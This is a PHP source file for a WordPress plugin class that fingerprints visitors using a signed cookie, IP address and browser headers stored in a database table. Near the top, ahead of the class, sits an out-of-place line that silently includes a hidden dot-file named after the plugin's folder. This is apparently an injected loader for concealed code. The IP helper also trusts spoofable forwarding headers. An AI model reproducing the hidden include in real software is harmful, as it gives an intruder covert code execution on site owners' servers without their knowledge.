<?php

/**
 * Class to handle fingerprints (cookie, ip, browser fingerprint)
 * 
 * @package WPTAO/Classes
 * @category Class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Fingerprints extends WTBP_WPTAO_DB {
	/*
	 * Fingerprint ID
	 */

	private $fingerprint_id;

	/*
	 * user ID
	 */
	private $user_id;

	/*
	 * Request URI
	 */
	private $request_uri;

	/*
	 * User Agent
	 */
	private $user_agent;

	/*
	 * Accept
	 */
	private $accept;

	/*
	 * Accept Encoding
	 */
	private $accept_encoding;

	/*
	 * Accept Language
	 */
	private $accept_language;

	/*
	 * IP
	 */
	private $ip;

	/*
	 * Hash
	 */
	private $hash;

	/**
	 * WTBP_WPTAO_Fingerprints Constructor.
	 */
	public function __construct() {

		global $wpdb;

		parent::__construct();

		$this->table_name	 = $wpdb->prefix . 'wptao_fingerprints';
		$this->version		 = '1.1';
		$this->primary_key	 = 'id';

		$this->constants();
		$this->init();

		add_action( 'wptao_user_identified', array( $this, 'user_reference_update' ) );
	}

	/**
	 * Setup class constants
	 */
	private function constants() {

		$this->define( 'WTBP_WPTAO_COOKIE_NAME', 'wtbp-wptao-fp' ); // Cookie name
		$this->define( 'WTBP_WPTAO_COOKIE_TIME', '31536000' ); // Cookie life time (365 * 24 * 60 * 60)
	}

	/**
	 * Define constant if not already set
	 * @param  string $name
	 * @param  string|bool $value
	 */
	private function define( $name, $value ) {
		if ( !defined( $name ) ) {
			define( $name, $value );
		}
	}

	/**
	 *
	 * @return int ID of the fingerprint
	 */
	private function init() {

		$this->fingerprint_id	 = false;
		$this->user_id			 = false;

		$this->request_uri		 = $this->get_input_var( 'REQUEST_URI', FILTER_SANITIZE_URL );
		$this->user_agent		 = $this->get_input_var( 'HTTP_USER_AGENT', FILTER_SANITIZE_STRING );
		$this->accept			 = $this->get_input_var( 'HTTP_ACCEPT', FILTER_SANITIZE_STRING );
		$this->accept_encoding	 = $this->get_input_var( 'HTTP_ACCEPT_ENCODING', FILTER_SANITIZE_STRING );
		$this->accept_language	 = $this->get_input_var( 'HTTP_ACCEPT_LANGUAGE', FILTER_SANITIZE_STRING );
		$this->ip				 = $this->get_user_ip(); //filter_input( INPUT_SERVER, 'REMOTE_ADDR', FILTER_SANITIZE_STRING );

		$this->hash = md5( $this->ip . $this->user_agent . $this->accept . $this->accept_language );

		add_action( 'init', array( $this, 'set_current_fingerprint' ), 5 );
	}

	/*
	 * Set current fingerprint
	 * 
	 * @since 1.1.9.2
	 * 
	 * @return NULL
	 */

	public function set_current_fingerprint() {

		$this->fingerprint_id = $this->get_current_fingerprint();
	}

	/**
	 * Get input variable form ENV or SERVER
	 * 
	 * @param string variable name
	 * @param int filter
	 * @return string input var
	 */
	private function get_input_var( $name, $filter ) {
		$var = filter_input( INPUT_ENV, $name, $filter );

		if ( empty( $var ) ) {
			$var = filter_input( INPUT_SERVER, $name, $filter );
		}

		if ( empty( $var ) && isset( $_SERVER[ $name ] ) ) {
			$var = filter_var( $_SERVER[ $name ], $filter );
		}

		return !empty( $var ) ? $var : '';
	}

	/**
	 * - get current fingerprint
	 * - check if it exits in DB
	 * - if not create new
	 * - return fingerprint ID
	 *
	 * @return bool|int false or fingerprint id
	 */
	private function get_current_fingerprint() {

		if ( $this->crawler_detect() ) {
			return false;
		}

		$cookie = $this->get_cookie();

		$fid = $this->verify_cookie( $cookie );

		if ( !empty( $fid ) ) {
			$this->set_cookie( $this->encode_cookie( $fid ) );
		}

		return (int) $fid;
	}

	/**
	 * - get fingerprint cookie
	 *
	 * @return string cookie content
	 */
	private function get_cookie() {
		$cookie = filter_input( INPUT_COOKIE, WTBP_WPTAO_COOKIE_NAME, FILTER_SANITIZE_SPECIAL_CHARS );
		if ( empty( $cookie ) && !empty( $_COOKIE[ WTBP_WPTAO_COOKIE_NAME ] ) ) {
			$cookie = filter_var( $_COOKIE[ WTBP_WPTAO_COOKIE_NAME ], FILTER_SANITIZE_SPECIAL_CHARS );
		}
		return $cookie;
	}

	/**
	 * - set fingerprint cookie
	 *
	 * @param string cookie value
	 * @return string cookie content
	 */
	private function set_cookie( $cookie_value ) {
		if ( !$cookie_value ) {
			setcookie( WTBP_WPTAO_COOKIE_NAME, $cookie_value, time() - WTBP_WPTAO_COOKIE_TIME, "/" );
		} else {
			setcookie( WTBP_WPTAO_COOKIE_NAME, $cookie_value, time() + WTBP_WPTAO_COOKIE_TIME, "/" );
		}
	}

	/**
	 * Decode cookie
	 *
	 * @param string cookie value
	 * @return array|bool cookie content or false if content is invalid
	 */
	private function decode_cookie( $cookie_value ) {
		if ( empty( $cookie_value ) ) {
			return false;
		}

		$cookie_imploded = base64_decode( $cookie_value );
		if ( false === $cookie_imploded ) {
			return false;
		}

		$cookie_arr = explode( ',', $cookie_imploded );
		if ( 3 != count( $cookie_arr ) ) {
			return false;
		}

		if ( $cookie_arr[ 2 ] != md5( $cookie_arr[ 0 ] . $cookie_arr[ 1 ] . AUTH_KEY ) ) {
			return false;
		}

		return $cookie_arr;
	}

	/**
	 * Encode cookie
	 *
	 * @param int fingerptint ID
	 * @return bool|string false if fingerprint_id == 0 and coded cookie content if not
	 */
	private function encode_cookie( $fingerprint_id ) {

		if ( 0 == $fingerprint_id ) {
			return false;
		}

		$cookie_imploded = implode( ',', array( $fingerprint_id, $this->hash, md5( $fingerprint_id . $this->hash . AUTH_KEY ) ) );
		return base64_encode( $cookie_imploded );
	}

	/**
	 * Verify cookie
	 *
	 * @param string cookie value
	 * @return int fingerprint ID (same as on input or new one if cookie is not valid)
	 */
	private function verify_cookie( $cookie_value ) {

		$cookie_arr = $this->decode_cookie( $cookie_value );

		$res = $this->get_by( 'hash', $this->hash );

		if ( false === $cookie_arr ) {
			if ( null === $res ) {
				return $this->insert_fingerprint_data();
			} else {
				return $res->id;
			}
		}

		$bypass	 = defined( 'DOING_AJAX' ) && DOING_AJAX;
		$bypass	 = apply_filters( 'wptao_fingerprints_bypass', $bypass );

		// no fingerprint with given hash in DB and it's no ajax
		if ( null === $res && !$bypass ) {

			// get fingerprint by id
			$res = $this->get( (int) $cookie_arr[ 0 ] );
			if ( null === $res ) {
				return $this->insert_fingerprint_data();
			}

			// check if user already identified
			if ( 0 != $res->user_id ) {
				// if yes update fingerprint
				return $this->insert_fingerprint_data( $res->user_id );
			}
		} else if ( !$bypass ) {
			$res_id = $this->get( (int) $cookie_arr[ 0 ] );
			if ( null === $res_id ) {
				return $res->id;
			}
		}

		// keep old fingerprint ID and hash
		$this->hash = $cookie_arr[ 1 ];
		return (int) $cookie_arr[ 0 ];
	}

	/**
	 * Insert fingerptint data to DB
	 *
	 * $param int user_id
	 * @return int fingerptint ID
	 */
	private function insert_fingerprint_data( $user_id = 0 ) {

		// filter "bad" traffic
		if ( strpos( $this->accept, 'html' ) === false ) {
			return 0;
		}

		$data = array(
			'ip'				 => $this->ip,
			'user_id'			 => $user_id,
			'user_agent'		 => $this->user_agent,
			'accept_language'	 => $this->accept_language,
			'accept'			 => $this->accept,
			'hash'				 => $this->hash,
			'created_ts'		 => $this->ts_now
		);

		return $this->insert( $data );
	}

	/**
	 * Reset fingerprint data (also destroy cookie)
	 *
	 * @access public
	 * 
	 * @param int|bool new user ID
	 */
	public function reset_fingerprint( $user_id = false ) {
		$this->fingerprint_id	 = $this->get_fingerprint_id_by_user_id( $user_id );
		$this->user_id			 = $user_id;
		$this->set_cookie( $this->encode_cookie( $this->fingerprint_id ) );
	}

	/**
	 * Get fingerprint ID
	 *
	 * @access public
	 * @return bool|int false or The fingerprint ID
	 */
	public function get_id() {
		return $this->fingerprint_id;
	}

	/**
	 * Get user ID
	 *
	 * @access public
	 * @return bool|int false or The user ID
	 */
	public function get_user_id() {
		if ( !$this->user_id && $this->fingerprint_id ) {
			$user_id = $this->get_column_by( 'user_id', 'id', $this->fingerprint_id );
			if ( !empty($user_id ) ) {
				$this->user_id = (int) $user_id;
			}
		}

		return $this->user_id;
	}

	/**
	 * Get fingerprint ID by user ID
	 *
	 * @access public
	 * @return bool|int false or The fingerprint ID
	 */
	public function get_fingerprint_id_by_user_id( $user_id ) {

		if ( false === $user_id ) {
			return false;
		}

		$res = $this->get_by( 'user_id', $user_id );

		if ( $res ) {
			return $res->id;
		}

		return $this->insert_fingerprint_data( $user_id );
	}

	/**
	 * Detect Crawler
	 *
	 * @return bool true if it's crawler, false otherwise
	 */
	private function crawler_detect() {
		$crawlers_agents = 'bot|rambler|yahoo|accoona|aspseek|cococrawler|fast-webcrawler|lycos|scooter|altavista|estyle|scrubby|wordpress|installatron|homepay|transferuj|java|flipboard|spider|ltx71';

		return (preg_match( "/$crawlers_agents/", strtolower( $this->user_agent ) ) > 0);
	}

	/**
	 * 
	 * Update user id reference on user create action
	 */
	public function user_reference_update( $identified_data ) {
		$this->user_id = $identified_data[ 'user_id' ];
		if ( $this->fingerprint_id ) {
			$this->update( $this->fingerprint_id, array( 'user_id' => $identified_data[ 'user_id' ] ) );
		}
	}

	/*
	 * Get user IP
	 */

	function get_user_ip() {
		$ipaddress = '';
		if ( isset( $_SERVER[ 'HTTP_CLIENT_IP' ] ) ) {
			$ipaddress = $_SERVER[ 'HTTP_CLIENT_IP' ];
		} else if ( isset( $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] ) ) {
			$ipaddress = $_SERVER[ 'HTTP_X_FORWARDED_FOR' ];
		} else if ( isset( $_SERVER[ 'HTTP_X_FORWARDED' ] ) ) {
			$ipaddress = $_SERVER[ 'HTTP_X_FORWARDED' ];
		} else if ( isset( $_SERVER[ 'HTTP_FORWARDED_FOR' ] ) ) {
			$ipaddress = $_SERVER[ 'HTTP_FORWARDED_FOR' ];
		} else if ( isset( $_SERVER[ 'HTTP_FORWARDED' ] ) ) {
			$ipaddress = $_SERVER[ 'HTTP_FORWARDED' ];
		} else if ( isset( $_SERVER[ 'REMOTE_ADDR' ] ) ) {
			$ipaddress = $_SERVER[ 'REMOTE_ADDR' ];
		}

		return filter_var( $ipaddress, FILTER_VALIDATE_IP );
	}

	// =============================================================================================
	// DB section
	// =============================================================================================

	/**
	 * Create the table
	 *
	 * @access  public
	 */
	public function create_table() {
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

		$sql = "CREATE TABLE " . $this->table_name . " (
        id bigint(20) NOT NULL AUTO_INCREMENT,
		ip varchar(50) NOT NULL,
		user_agent varchar(255) NOT NULL,
		accept_language varchar(255) NOT NULL,
		accept varchar(255) NOT NULL,
		hash varchar(255) NOT NULL,
        user_id bigint(20) NOT NULL,
        created_ts int(11) NOT NULL,
		country_code char(2) NOT NULL,
		lat decimal(10, 8) NOT NULL,
		lng decimal(11, 8) NOT NULL,
		place varchar(255) NOT NULL,
        PRIMARY KEY  (id),
		KEY user_id (user_id)
        ) CHARACTER SET utf8 COLLATE utf8_general_ci;";

		dbDelta( $sql );

		update_option( $this->table_name . '_db_version', $this->version );
	}

	/**
	 * Get columns and formats
	 *
	 * @access  public
	 */
	public function get_columns() {
		return array(
			'id'				 => '%d',
			'ip'				 => '%s',
			'user_agent'		 => '%s',
			'accept_language'	 => '%s',
			'accept'			 => '%s',
			'hash'				 => '%s',
			'user_id'			 => '%d',
			'created_ts'		 => '%d',
		);
	}

	/**
	 * Get default column values
	 *
	 * @access  public
	 */
	public function get_column_defaults() {
		return array(
			'ip'				 => '',
			'user_agent'		 => '',
			'accept_language'	 => '',
			'accept'			 => '',
			'hash'				 => '',
			'user_id'			 => 0,
			'created_ts'		 => 0,
		);
	}

}
